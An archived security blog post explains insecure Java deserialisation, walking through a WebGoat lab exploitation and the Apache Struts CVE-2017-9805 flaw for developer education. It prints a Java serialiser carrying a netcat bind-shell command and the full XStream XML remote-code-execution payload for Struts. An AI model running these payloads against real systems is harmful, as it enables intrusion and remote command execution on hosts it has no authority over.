+<p>The ability to persist the state of an object so that it can be stored, or transmitted across a network and reconstructed, allows separate components of a distributed application to interact using common objects directly, without the need to encode and decode to and from other state representations and communications protocols, and regardless of any differences in host platform.</p>
+
+
+
+<p>Serialisation is an approach that&#8217;s also used when implementing web APIs, microservices, and by client-side MVC web frameworks such as <a href="https://angularjs.org/"><span class="has-inline-color has-luminous-vivid-amber-color">AngularJS</span></a> and <a href="https://emberjs.com/"><span class="has-inline-color has-luminous-vivid-amber-color">Ember</span></a>.</p>
+
+
+
+<p>Unsafe or insecure deserialisation arises when the serialised data received by a subsystem is trusted without prejudice. If the data can be modified by, or originates from, an intermediate party and the contents are not sanitised by the recipient to eliminate any malicious payloads, then a vulnerability is introduced.</p>
+
+
+<h3 class="wp-block-heading" id="java-serialisation">Java serialisation</h3>
+
+
+<p>The Java platform contains the <a href="https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/io/Serializable.html"><span class="has-inline-color has-luminous-vivid-amber-color">Serializable</span> </a>interface &#8211; classes which implement it must provide a number of methods, one of which (<em><span class="has-inline-color has-white-color">readObject</span></em>) accepts a serialised instance of itself in the form of a <span class="has-inline-color has-white-color"><em>ObjectInputStream</em> </span>object.</p>
+
+
+
+<p>This method deserialises the passed-in serialised object, obtaining from it attribute values which are used to populate a new empty instance of the class, effectively re-creating the original object in memory. This object can then be interacted with in the same way as objects generated in the &#8220;usual&#8221; way by the JVM at runtime from compiled bytecode.</p>
+
+
+
+<p>This mechanism might be used within a distributed component architecture, allowing disparate subsystems using serialised objects to communicate over a network. It could be viewed as painless  way of passing commands from one subsystem to a remote, subordinate subsystem without having to worry about conversion between communications protocols.</p>
+
+
+
+<p>However, this immediately introduces an unsafe deserialisation vulnerability &#8211; one which may seem negligible in a trusted environment, but which can lead to significant risk if the serialised data passed in to the system can be accessed (or even originated) by attackers.</p>
+
+
+<h2 class="wp-block-heading" id="unsafe-java-deserialisation-using-webgoat-as-an-example">Unsafe Java deserialisation using WebGoat as an example</h2>
+
+
+<p>To try and help demonstrate this concept, I&#8217;ve used <strong><a href="https://owasp.org/www-project-webgoat/"><span class="has-inline-color has-luminous-vivid-amber-color">WebGoat</span> </a></strong>&#8211; a deliberately insecure, open source Java web application developed by<span class="has-inline-color has-white-color"> <a href="https://owasp.org/"><span class="has-inline-color has-luminous-vivid-amber-color">OWASP</span></a> </span>to act as a training aid for developers and security technologists.</p>
+
+
+
+<figure class="wp-block-image size-large"><a href="./../wp-content/uploads/2021/09/az-webgoat.jpg"><img decoding="async" width="1024" height="648" src="./../wp-content/uploads/2021/09/az-webgoat-1024x648.jpg" alt="" class="wp-image-479" srcset="./../wp-content/uploads/2021/09/az-webgoat-1024x648.jpg 1024w, ./../wp-content/uploads/2021/09/az-webgoat-300x190.jpg 300w, ./../wp-content/uploads/2021/09/az-webgoat-768x486.jpg 768w, ./../wp-content/uploads/2021/09/az-webgoat-210x133.jpg 210w, ./../wp-content/uploads/2021/09/az-webgoat.jpg 1516w" sizes="(max-width: 980px) 100vw, 980px"></a><figcaption><em>WebGoat running in an Azure container instance</em></figcaption></figure>
+
+
+<h3 class="wp-block-heading" id="explanation-of-the-vulnerability">Explanation of the vulnerability</h3>
+
+
+<p>The <span class="has-inline-color has-white-color">WebGoat </span>application contains a Java class <em><span class="has-inline-color has-white-color">VulnerableTaskHolder</span></em> which implements the Java <em><span class="has-inline-color has-white-color">Serializable </span></em>interface. Objects of this class have attributes which have values assigned to them before serialisation takes place. The object is then serialised, and transmitted to the remote subsystem, where it is received and deserialised causing its overidden <em><span class="has-inline-color has-white-color">readObject </span></em>method to be executed. In this particular example, the <em><span class="has-inline-color has-white-color">readObject </span></em>method expects one of its attributes to be assigned a String value representing a system command, which it then executes within a new sub-process. In other the system makes unsafe assumptions about the security of its host environment. It assumes all input will be benign and makes no attempt to sanitise the data it receives before deserialising it and executing the contents.</p>
+
+
+<h3 class="wp-block-heading" id="exploitation">Exploitation</h3>
+
+
+<p>The vulnerable method is exposed to the internet by an API endpoint. This is normally called via a form on the web client UI provided with the <span class="has-inline-color has-white-color">WebGoat</span> application. In this example however, we&#8217;ll interact with the endpoint directly via an interception proxy (<a href="https://portswigger.net/burp"><span class="has-inline-color has-luminous-vivid-amber-color">Portswigger Burp Suite</span></a>):</p>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter size-large"><a href="./../wp-content/uploads/2021/08/burp-orig.png"><img loading="lazy" decoding="async" width="1024" height="855" src="./../wp-content/uploads/2021/08/burp-orig-1024x855.png" alt="" class="wp-image-405" srcset="./../wp-content/uploads/2021/08/burp-orig-1024x855.png 1024w, ./../wp-content/uploads/2021/08/burp-orig-300x250.png 300w, ./../wp-content/uploads/2021/08/burp-orig-768x641.png 768w, ./../wp-content/uploads/2021/08/burp-orig-210x175.png 210w, ./../wp-content/uploads/2021/08/burp-orig.png 1151w" sizes="(max-width: 980px) 100vw, 980px"></a><figcaption>Request to endpoint captured in Burp Suite</figcaption></figure></div>
+
+
+
+<div class="wp-block-group"><div class="wp-block-group__inner-container is-layout-flow wp-block-group-is-layout-flow">
+<p>A scan against the target reveals an open port; if the host OS happens to have default components installed such as<span class="has-inline-color has-luminous-vivid-amber-color"> <a href="https://sourceforge.net/p/nc110/git/ci/master/tree/">Netcat</a></span>, we might be able to start a bind shell which we can interact with remotely:</p>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter size-full"><a href="./../wp-content/uploads/2021/08/nmap-1.png"><img loading="lazy" decoding="async" width="775" height="335" src="./../wp-content/uploads/2021/08/nmap-1.png" alt="" class="wp-image-410" srcset="./../wp-content/uploads/2021/08/nmap-1.png 775w, ./../wp-content/uploads/2021/08/nmap-1-300x130.png 300w, ./../wp-content/uploads/2021/08/nmap-1-768x332.png 768w, ./../wp-content/uploads/2021/08/nmap-1-210x91.png 210w" sizes="(max-width: 775px) 100vw, 775px"></a><figcaption><em>Finding an open port on the target for the shell</em></figcaption></figure></div>
+</div></div>
+
+
+
+<p>Exploitation involves having knowledge of the structure of the vulnerable Java class. In this scenario, WebGoat is open source, so the class structure is easy to obtain, but in a real-world scenario with a closed source target, an attacker might be able to find this out for example via an exposed source code repository, or by reverse engineering the application&#8217;s Java byte code.</p>
+
+
+
+<p>Armed with this knowledge, we can write a small program which creates an instance of the vulnerable class, populates it with a malicious system command (line 34) and then serialises it:</p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="java" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="true" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">package org.dummy.insecure.framework;
+
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStreamReader;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.io.Serializable;
+import java.time.LocalDateTime;
+import java.io.ByteArrayOutputStream;
+import java.io.ByteArrayInputStream;
+import java.util.Base64;
+
+
+public class VulnerableTaskHolder implements Serializable
+{
+    private static final long serialVersionUID = 2;
+
+    private String taskName;
+    private String taskAction;
+    private LocalDateTime requestedExecutionTime;
+
+    public VulnerableTaskHolder(String taskName, String taskAction)
+    {
+        super();
+        this.taskName = taskName;
+        this.taskAction = taskAction;
+        // cater for BST time delta on the target server
+        this.requestedExecutionTime = LocalDateTime.now().minusHours(1);
+    }
+
+    public static void main(String[] args)
+    {
+        VulnerableTaskHolder go = new VulnerableTaskHolder
+            ("bind shell", "nc -nlvp 8088 -e /bin/bash");
+        try
+        {
+            ByteArrayOutputStream bos = new ByteArrayOutputStream();
+            ObjectOutputStream oos = new ObjectOutputStream(bos);
+            oos.writeObject(go);
+            oos.flush();
+            oos.close();
+            System.out.println(Base64.getEncoder()
+                .encodeToString(bos.toByteArray()));
+        }
+        catch (IOException ioe)
+        {
+            System.out.println(ioe.getLocalizedMessage());
+        }
+    }
+}</pre>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter size-full"><a href="./../wp-content/uploads/2021/08/token-1.png"><img loading="lazy" decoding="async" width="945" height="107" src="./../wp-content/uploads/2021/08/token-1.png" alt="" class="wp-image-412" srcset="./../wp-content/uploads/2021/08/token-1.png 945w, ./../wp-content/uploads/2021/08/token-1-300x34.png 300w, ./../wp-content/uploads/2021/08/token-1-768x87.png 768w, ./../wp-content/uploads/2021/08/token-1-210x24.png 210w" sizes="(max-width: 945px) 100vw, 945px"></a><figcaption><em>Generating the serialised data</em></figcaption></figure></div>
+
+
+
+<p>We can then inject this serialised data into the captured HTTP request as a POST body parameter within the interception proxy, and transmit it to the endpoint, where the application will deserialise and execute it. Note that the package must match the package of the class as it is used in the target application. <em>Note:</em> <em>We also need to embed the current system time into the object &#8211; this is a requirement peculiar to WebGoat (introduced presumably to thwart attempts to solve the associated training exercise using pre-canned solutions)</em> :<span class="has-inline-color has-black-color">.</span></p>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter size-large is-resized"><a href="./../wp-content/uploads/2021/08/burp-mod.png"><img loading="lazy" decoding="async" src="./../wp-content/uploads/2021/08/burp-mod-1024x808.png" alt="" class="wp-image-406" width="720" height="568" srcset="./../wp-content/uploads/2021/08/burp-mod-1024x808.png 1024w, ./../wp-content/uploads/2021/08/burp-mod-300x237.png 300w, ./../wp-content/uploads/2021/08/burp-mod-768x606.png 768w, ./../wp-content/uploads/2021/08/burp-mod-210x166.png 210w, ./../wp-content/uploads/2021/08/burp-mod.png 1044w" sizes="(max-width: 720px) 100vw, 720px"></a><figcaption><em>Captured request modified to include serialised payload</em></figcaption></figure></div>
+
+
+
+<p>If we now start a Netcat instance on our attacking host, using the IP address of the target host and the port on which the payload is listening, we should be able to establish a bind shell which will accept commands, execute them and return the subsequent output:</p>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter size-full"><a href="./../wp-content/uploads/2021/08/bindshell.png"><img loading="lazy" decoding="async" width="799" height="639" src="./../wp-content/uploads/2021/08/bindshell.png" alt="" class="wp-image-407" srcset="./../wp-content/uploads/2021/08/bindshell.png 799w, ./../wp-content/uploads/2021/08/bindshell-300x240.png 300w, ./../wp-content/uploads/2021/08/bindshell-768x614.png 768w, ./../wp-content/uploads/2021/08/bindshell-210x168.png 210w" sizes="(max-width: 799px) 100vw, 799px"></a><figcaption><em>Using the bind shell on the target to execute system commands</em></figcaption></figure></div>
+
+
+
+<p>We have a low-privilege shell executing in the context of the WebGoat user, which only allows limited interaction with the target host. The next step would be to attempt privilege escalation to upgrade the shell to one with system privileges, which is beyond the scope of this post.</p>
+
+
+
+<p>It does demonstrate however that a simple vulnerability can give an initial foothold from which a more sophisticated attack could be launched. Compromising this host may not provide direct access  to sensitive or valuable data itself, but it could form part of a multi-stage attack, for example by being used to host an SSH tunnel between internal network segments to aid exploit upload and/or data exfiltration, as a platform for creating new system user accounts, or for launching credential harvesting phishing attacks against other internal users. </p>
+
+
+
+<p>If this this vulnerability was present in a production system, and threat modelling indicated that (a) the likelihood of exploitation was high, and (b) a high value information asset would be negatively impacted, this would expose the organisation to a very high level of risk, and as such it would be given a high priority for mitigation.</p>
+
+
+<h2 class="wp-block-heading" id="deserialisation-vulnerabilities-in-the-wild">Deserialisation Vulnerabilities In The Wild</h2>
+
+
+<p>The scenario described above is obviously a highly contrived, simplified example constructed to help illustrate a concept.</p>
+
+
+
+<p>Real-world deserialisation vulnerabilities are usually much more complicated to exploit, typically involving a cascading sequence of unsafe deserialisation operations involving many classes (also known as a &#8220;Gadget Chain&#8221;) which ultimately leads to the actual compromise.</p>
+
+
+
+<p>However, deserialisation vulnerabilities of this nature do occur in the wild &#8211; one such example is <a href="https://nvd.nist.gov/vuln/detail/cve-2017-9805"><span class="has-inline-color has-luminous-vivid-amber-color">CVE-2017-9805</span></a>, a flaw within the <a href="http://struts.apache.org/plugins/rest/"><span class="has-inline-color has-luminous-vivid-amber-color">REST Plugin</span></a> in the <a href="http://struts.apache.org/index.html"><span class="has-inline-color has-luminous-vivid-amber-color">Apache Struts</span></a> MVC Java framework which remained undiscovered for nine years until it was found by security researcher <a target="_blank" href="https://github.com/m-y-mo" rel="noreferrer noopener"><span class="has-inline-color has-luminous-vivid-amber-color">Man Yue Mo</span></a> in July 2017 and which was initially blamed in part for the <a href="https://www.equifax.co.uk/about-equifax/press-releases/en_gb/-/blog/equifax-ltd-uk-update-regarding-the-ongoing-investigation-into-us-cyber-security-incident"><span class="has-inline-color has-luminous-vivid-amber-color">Equifax data breach</span></a> in September 2017.</p>
+
+
+<h3 class="wp-block-heading" id="cve20179805">CVE-2017-9805</h3>
+
+
+<div class="wp-block-image"><figure class="aligncenter size-medium_large"><a href="./../wp-content/uploads/2021/08/nist-cve-2017-9805.png"><img loading="lazy" decoding="async" width="768" height="392" src="./../wp-content/uploads/2021/08/nist-cve-2017-9805-768x392.png" alt="NIST CVE-2017-9805" class="wp-image-392" srcset="./../wp-content/uploads/2021/08/nist-cve-2017-9805-768x392.png 768w, ./../wp-content/uploads/2021/08/nist-cve-2017-9805-300x153.png 300w, ./../wp-content/uploads/2021/08/nist-cve-2017-9805-1024x523.png 1024w, ./../wp-content/uploads/2021/08/nist-cve-2017-9805-210x107.png 210w, ./../wp-content/uploads/2021/08/nist-cve-2017-9805.png 1263w" sizes="(max-width: 768px) 100vw, 768px"></a><figcaption><a href="https://nvd.nist.gov/vuln/detail/cve-2017-9805" target="_blank" rel="noreferrer noopener">https://nvd.nist.gov/vuln/detail/cve-2017-9805</a></figcaption></figure></div>
+
+
+
+<p>The vulnerable class within the plugin deserialises data passed into it in XML format without performing any sanitisation of its contents. The result is that a suitably crafted payload can be used to cause remote code execution on the host machine, in a similar way to that demonstrated above on the WebGoat application, the difference here being that the payload needs to be structured as XML data before serialisation.</p>
+
+
+
+<p>Exploiting the vulnerability involves sending an HTTP POST request to the target host, with the request body data formatted as shown in the snippet below, with the [command] placeholder on line 17 edited to contain the system command to be executed on deserialisation:</p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="xml" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="true" data-enlighter-lineoffset="214" data-enlighter-title="" data-enlighter-group="">&lt;map>
+&lt;entry>
+&lt;jdk.nashorn.internal.objects.NativeString>
+&lt;flags>0&lt;/flags>
+&lt;value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
+&lt;dataHandler>
+&lt;dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
+&lt;is class="javax.crypto.CipherInputStream">
+&lt;cipher class="javax.crypto.NullCipher">
+&lt;initialized>false&lt;/initialized>
+&lt;opmode>0&lt;/opmode>
+&lt;serviceIterator class="javax.imageio.spi.FilterIterator">
+&lt;iter class="javax.imageio.spi.FilterIterator">
+&lt;iter class="java.util.Collections$EmptyIterator"/>
+&lt;next class="java.lang.ProcessBuilder">
+&lt;command>
+&lt;string>/bin/sh&lt;/string>&lt;string>-c&lt;/string>&lt;string> [command] &lt;/string>
+&lt;/command>
+&lt;redirectErrorStream>false&lt;/redirectErrorStream>
+&lt;/next>
+&lt;/iter>
+&lt;filter class="javax.imageio.ImageIO$ContainsFilter">
+&lt;method>
+&lt;class>java.lang.ProcessBuilder&lt;/class>
+&lt;name>start&lt;/name>
+&lt;parameter-types/>
+&lt;/method>
+&lt;name>foo&lt;/name>
+&lt;/filter>
+&lt;next class="string">foo&lt;/next>
+&lt;/serviceIterator>
+&lt;lock/>
+&lt;/cipher>
+&lt;input class="java.lang.ProcessBuilder$NullInputStream"/>
+&lt;ibuffer/>
+&lt;done>false&lt;/done>
+&lt;ostart>0&lt;/ostart>
+&lt;ofinish>0&lt;/ofinish>
+&lt;closed>false&lt;/closed>
+&lt;/is>
+&lt;consumed>false&lt;/consumed>
+&lt;/dataSource>
+&lt;transferFlavors/>
+&lt;/dataHandler>
+&lt;dataLen>0&lt;/dataLen>
+&lt;/value>
+&lt;/jdk.nashorn.internal.objects.NativeString>
+&lt;jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
+&lt;/entry>
+&lt;entry>
+&lt;jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
+&lt;jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
+&lt;/entry>
+&lt;/map>
+
+
+</pre>
+
+
+
+<p>A pre/post fix analysis of the vulnerable Struts REST plugin class <em><a href="https://struts.apache.org/maven/struts2-plugins/struts2-rest-plugin/apidocs/org/apache/struts2/rest/handler/XStreamHandler.html"><span class="has-inline-color has-luminous-vivid-amber-color">XStreamHandler</span></a> </em>(performed by <a href="https://www.mcafee.com/blogs/other-blogs/mcafee-labs/apache-struts-at-rest-analyzing-remote-code-execution-vulnerability-cve-2017-9805/"><span class="has-inline-color has-luminous-vivid-amber-color">Hardik Shah of McAfee Labs</span></a>) shows that pre-fix, the methods responsible for serialising to and from XML and Java objects: <span class="has-inline-color has-white-color"><em>fromObject</em> </span>and <em><span class="has-inline-color has-white-color">toObject</span>,</em> did so by creating instances of the <em><a href="https://x-stream.github.io/"><span class="has-inline-color has-luminous-vivid-amber-color">XStream</span></a> </em>XML parser class with default invocation permissions. This meant that there was no filtering being performed on the contents of the data being deserialised. Post-fix, the methods now expect an extra<em> </em>parameter of type <em><a href="https://struts.apache.org/maven/struts2-core/apidocs/com/opensymphony/xwork2/ActionInvocation.html"><span class="has-inline-color has-luminous-vivid-amber-color"><em>Action</em>Invocation</span></a></em>. This is used to set the permissions on the <em><span class="has-inline-color has-white-color">XStream</span> </em>XML parser &#8211; effectively applying a whitelist filter to the deserialised data content before it is used to construct a Java object:</p>
+
+
+
+<figure class="wp-block-image size-large"><a href="./../wp-content/uploads/2021/09/mcafee_001.png"><img loading="lazy" decoding="async" width="1024" height="434" src="./../wp-content/uploads/2021/09/mcafee_001-1024x434.png" alt="" class="wp-image-455" srcset="./../wp-content/uploads/2021/09/mcafee_001-1024x434.png 1024w, ./../wp-content/uploads/2021/09/mcafee_001-300x127.png 300w, ./../wp-content/uploads/2021/09/mcafee_001-768x326.png 768w, ./../wp-content/uploads/2021/09/mcafee_001-210x89.png 210w, ./../wp-content/uploads/2021/09/mcafee_001.png 1106w" sizes="(max-width: 980px) 100vw, 980px"></a></figure>
+
+
+<h2 class="wp-block-heading" id="summary">Summary</h2>
+
+
+<p>I think the following <a href="https://blogs.apache.org/foundation/entry/apache-struts-statement-on-equifax"><span class="has-inline-color has-luminous-vivid-amber-color">quote from the Apache Struts development team</span></a> in response to CVE-2017-9805 epitomises the view outlined at the beginning of this post &#8211; that in the drive to deliver functionality, it is all too easy to introduce vulnerabilities unwittingly, unless security requirements are given the same level of importance as functional and other non-functional requirements from the outset:</p>
+
+
+
+<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
+<p>Regarding the assertion that especially CVE-2017-9805 is a nine year old security flaw, one has to understand that there is a huge difference between detecting a flaw after nine years and knowing about a flaw for several years. If the latter was the case, the team would have had a hard time to provide a good answer why they did not fix this earlier. But this was actually not the case here &#8211; we were notified just recently on how a certain piece of code can be misused, and we fixed this ASAP. What we saw here is common software engineering business &#8211; <span class="has-inline-color has-vivid-red-color">people write code for achieving a desired function, but may not be aware of undesired side-effects</span>. Once this awareness is reached, we as well as hopefully all other library and framework maintainers put high efforts into removing the side-effects as soon as possible.</p>
+<cite><a href="https://blogs.apache.org/foundation/entry/apache-struts-statement-on-equifax" target="_blank" rel="noreferrer noopener">https://blogs.apache.org/foundation/entry/apache-struts-statement-on-equifax</a></cite>
+</blockquote>
+
+
+
+<p></p>
+			</div>
+<!-- .entry-content -->
+
+	<footer class="entry-footer">
+		<span class="update">Updated: <a href="./index.html" rel="bookmark"><time class="published updated" datetime="2021-09-13T15:11:02+01:00">September 13, 2021</time></a></span><br><span class="cat-links">Categories: <a href="./../category/application-security/index.html" rel="category tag">Application Security</a>, <a href="./../category/business-risk/index.html" rel="category tag">Business Risk</a>, <a href="./../category/insecure-deserialisation/index.html" rel="category tag">Insecure Deserialisation</a>, <a href="./../category/java/index.html" rel="category tag">Java</a>, <a href="./../category/lateral-movement/index.html" rel="category tag">Lateral Movement</a>, <a href="./../category/threat-modeling/index.html" rel="category tag">Threat Modeling</a></span>	</footer><!-- .entry-footer -->
+</article><!-- #post-## -->
+						
+	<nav class="navigation post-navigation" aria-label="Post navigation">
+		<h2 class="screen-reader-text">Post navigation</h2>
+		<div class="nav-links">
+<div class="nav-previous"><a href="./../cloud-hosted-honeypots-harvesting-attack-packet-captures/index.html" rel="prev">Previous post</a></div>
+<div class="nav-next"><a href="./../shift-left-azure-pipelines/index.html" rel="next">Next post</a></div>
+</div>
+	</nav>
+			
+		
+		</main><!-- #main -->
+	</div>
+<!-- #primary -->
+
+
+<div id="secondary" class="widget-area egrid  grid-20 tablet-grid-20 mobile-grid-100 pull-80 tablet-pull-80" role="complementary">
+
+		<aside id="recent-posts-2" class="widget widget_recent_entries">
+		<h4 class="widget-title">Recent Posts</h4>
+		<ul>
+											<li>
+					<a href="./../shift-left-azure-pipelines/index.html">Shifting Left On A Shoestring: Azure DevSecOps Pipelines</a>
+									</li>
+											<li>
+					<a href="./index.html" aria-current="page">Software Vulnerabilities and Business Risk</a>
+									</li>
+											<li>
+					<a href="./../cloud-hosted-honeypots-harvesting-attack-packet-captures/index.html">Cloud Hosted Honeypots: Harvesting Attack Packet Captures</a>
+									</li>
+											<li>
+					<a href="./../snort-custom-dynamic-preprocessor/index.html">Snort IDS Custom Dynamic Preprocessor, Part 1</a>
+									</li>
+											<li>
+					<a href="./../throwing-star-lan-tap/index.html">Throwing Star LAN Tap</a>
+									</li>
+					</ul>
+
+		</aside><aside id="recent-comments-2" class="widget widget_recent_comments"><h4 class="widget-title">Recent Comments</h4>
+<ul id="recentcomments"></ul></aside><aside id="categories-2" class="widget widget_categories"><h4 class="widget-title">Categories</h4>
+			<ul>
+					<li class="cat-item cat-item-33">
+<a href="./../category/application-security/index.html">Application Security</a>
+</li>
+	<li class="cat-item cat-item-37">
+<a href="./../category/azure/index.html">Azure</a>
+</li>
+	<li class="cat-item cat-item-32">
+<a href="./../category/business-risk/index.html">Business Risk</a>
+</li>
+	<li class="cat-item cat-item-40">
+<a href="./../category/ci-cd/index.html">CI-CD</a>
+</li>
+	<li class="cat-item cat-item-55">
+<a href="./../category/containers/index.html">Containers</a>
+</li>
+	<li class="cat-item cat-item-42">
+<a href="./../category/dast/index.html">DAST</a>
+</li>
+	<li class="cat-item cat-item-38">
+<a href="./../category/devsecops/index.html">DevSecOps</a>
+</li>
+	<li class="cat-item cat-item-44">
+<a href="./../category/docker/index.html">Docker</a>
+</li>
+	<li class="cat-item cat-item-46">
+<a href="./../category/eclipse/index.html">Eclipse</a>
+</li>
+	<li class="cat-item cat-item-50">
+<a href="./../category/git/index.html">Git</a>
+</li>
+	<li class="cat-item cat-item-48">
+<a href="./../category/h2-database/index.html">H2 Database</a>
+</li>
+	<li class="cat-item cat-item-26">
+<a href="./../category/honeypot/index.html">Honeypot</a>
+</li>
+	<li class="cat-item cat-item-19">
+<a href="./../category/ids/index.html">IDS</a>
+</li>
+	<li class="cat-item cat-item-34">
+<a href="./../category/insecure-deserialisation/index.html">Insecure Deserialisation</a>
+</li>
+	<li class="cat-item cat-item-35">
+<a href="./../category/java/index.html">Java</a>
+</li>
+	<li class="cat-item cat-item-49">
+<a href="./../category/junit/index.html">JUnit</a>
+</li>
+	<li class="cat-item cat-item-36">
+<a href="./../category/lateral-movement/index.html">Lateral Movement</a>
+</li>
+	<li class="cat-item cat-item-47">
+<a href="./../category/maven/index.html">Maven</a>
+</li>
+	<li class="cat-item cat-item-17">
+<a href="./../category/network-reconnaissance/index.html">Network Reconnaissance</a>
+</li>
+	<li class="cat-item cat-item-53">
+<a href="./../category/owasp-zap/index.html">OWASP ZAP</a>
+</li>
+	<li class="cat-item cat-item-39">
+<a href="./../category/pipeline/index.html">Pipeline</a>
+</li>
+	<li class="cat-item cat-item-41">
+<a href="./../category/sast/index.html">SAST</a>
+</li>
+	<li class="cat-item cat-item-43">
+<a href="./../category/sca/index.html">SCA</a>
+</li>
+	<li class="cat-item cat-item-52">
+<a href="./../category/shiftleft/index.html">ShiftLeft</a>
+</li>
+	<li class="cat-item cat-item-23">
+<a href="./../category/siem/index.html">SIEM</a>
+</li>
+	<li class="cat-item cat-item-51">
+<a href="./../category/snyk/index.html">Snyk</a>
+</li>
+	<li class="cat-item cat-item-45">
+<a href="./../category/spring-boot/index.html">Spring Boot</a>
+</li>
+	<li class="cat-item cat-item-54">
+<a href="./../category/sql-injection/index.html">SQL Injection</a>
+</li>
+	<li class="cat-item cat-item-27">
+<a href="./../category/threat-intelligence/index.html">Threat Intelligence</a>
+</li>
+	<li class="cat-item cat-item-31">
+<a href="./../category/threat-modeling/index.html">Threat Modeling</a>
+</li>
+	<li class="cat-item cat-item-1">
+<a href="./../category/uncategorized/index.html">Uncategorized</a>
+</li>
+	<li class="cat-item cat-item-6">
+<a href="./../category/windows-exploits/index.html">Windows Exploits</a>
+</li>
+			</ul>
+
+			</aside><aside id="tag_cloud-3" class="widget widget_tag_cloud"><h4 class="widget-title">Tags</h4>
+<div class="tagcloud">
+<a href="./../tag/buffer-overflow/index.html" class="tag-cloud-link tag-link-10 tag-link-position-1" style="font-size: 8pt;" aria-label="Buffer Overflow (1 item)">Buffer Overflow</a>
+<a href="./../tag/ethernet/index.html" class="tag-cloud-link tag-link-13 tag-link-position-2" style="font-size: 8pt;" aria-label="Ethernet (1 item)">Ethernet</a>
+<a href="./../tag/exploits/index.html" class="tag-cloud-link tag-link-8 tag-link-position-3" style="font-size: 8pt;" aria-label="Exploits (1 item)">Exploits</a>
+<a href="./../tag/honeypot/index.html" class="tag-cloud-link tag-link-28 tag-link-position-4" style="font-size: 8pt;" aria-label="Honeypot (1 item)">Honeypot</a>
+<a href="./../tag/ids/index.html" class="tag-cloud-link tag-link-20 tag-link-position-5" style="font-size: 8pt;" aria-label="IDS (1 item)">IDS</a>
+<a href="./../tag/kali/index.html" class="tag-cloud-link tag-link-11 tag-link-position-6" style="font-size: 8pt;" aria-label="Kali (1 item)">Kali</a>
+<a href="./../tag/metasploit/index.html" class="tag-cloud-link tag-link-12 tag-link-position-7" style="font-size: 8pt;" aria-label="Metasploit (1 item)">Metasploit</a>
+<a href="./../tag/mhn/index.html" class="tag-cloud-link tag-link-29 tag-link-position-8" style="font-size: 8pt;" aria-label="MHN (1 item)">MHN</a>
+<a href="./../tag/network/index.html" class="tag-cloud-link tag-link-14 tag-link-position-9" style="font-size: 22pt;" aria-label="Network (2 items)">Network</a>
+<a href="./../tag/packet-capture/index.html" class="tag-cloud-link tag-link-16 tag-link-position-10" style="font-size: 22pt;" aria-label="Packet Capture (2 items)">Packet Capture</a>
+<a href="./../tag/plugin/index.html" class="tag-cloud-link tag-link-22 tag-link-position-11" style="font-size: 8pt;" aria-label="Plugin (1 item)">Plugin</a>
+<a href="./../tag/seh/index.html" class="tag-cloud-link tag-link-9 tag-link-position-12" style="font-size: 8pt;" aria-label="SEH (1 item)">SEH</a>
+<a href="./../tag/siem/index.html" class="tag-cloud-link tag-link-24 tag-link-position-13" style="font-size: 8pt;" aria-label="SIEM (1 item)">SIEM</a>
+<a href="./../tag/snort/index.html" class="tag-cloud-link tag-link-21 tag-link-position-14" style="font-size: 8pt;" aria-label="Snort (1 item)">Snort</a>
+<a href="./../tag/splunk/index.html" class="tag-cloud-link tag-link-25 tag-link-position-15" style="font-size: 8pt;" aria-label="Splunk (1 item)">Splunk</a>
+<a href="./../tag/threat-intelligence/index.html" class="tag-cloud-link tag-link-30 tag-link-position-16" style="font-size: 8pt;" aria-label="Threat Intelligence (1 item)">Threat Intelligence</a>
+<a href="./../tag/windows/index.html" class="tag-cloud-link tag-link-7 tag-link-position-17" style="font-size: 8pt;" aria-label="Windows (1 item)">Windows</a>
+<a href="./../tag/wireshark/index.html" class="tag-cloud-link tag-link-18 tag-link-position-18" style="font-size: 22pt;" aria-label="Wireshark (2 items)">Wireshark</a>
+</div>
+</aside>
+</div>
+<!-- #secondary -->
+
+	</div>
+<!-- #content -->
+
+	<footer id="colophon" class="site-footer grid-container" role="contentinfo">
+		<div class="grid-100 tablet-grid-100 mobile-grid-100"><div class="sepline2"></div></div>
+		<div class="egrid  grid-70 tablet-grid-70 mobile-grid-100" id="footer-widget-copyright">
+					</div>
+		<div class=" grid-30 tablet-grid-30 mobile-grid-100">
+			<a id="designer" class="alignright" href="https://www.coralthemes.com/product/coral-dark-wordpress-theme/">Free dark wordpress theme</a>
+		</div>
+		
+	</footer><!-- #colophon -->
+</div>
+<!-- #page -->
+
+<script type="text/javascript" src="./../wp-content/themes/coral-dark/js/jquery.smartmenus.min.js?ver=0.9.7" id="smartmenus-js"></script>
+<script type="text/javascript" src="./../wp-content/themes/coral-dark/js/skip-link-focus-fix.js?ver=20130115" id="coral-dark-skip-link-focus-fix-js"></script>
+<script type="text/javascript" id="coral-dark-script-js-extra">
+/* <![CDATA[ */
+var nivoSliderParams = {"effect":"fade","animspeed":"500","pausetime":"5000"};
+/* ]]> */
+</script>
+<script type="text/javascript" src="./../wp-content/themes/coral-dark/js/functions.js?ver=20160427" id="coral-dark-script-js"></script>
+<script type="text/javascript" src="./../wp-content/plugins/enlighter/cache/enlighterjs.min.js?ver=FEHentKvd4xOWg9" id="enlighterjs-js"></script>
+<script type="text/javascript" id="enlighterjs-js-after">
+/* <![CDATA[ */
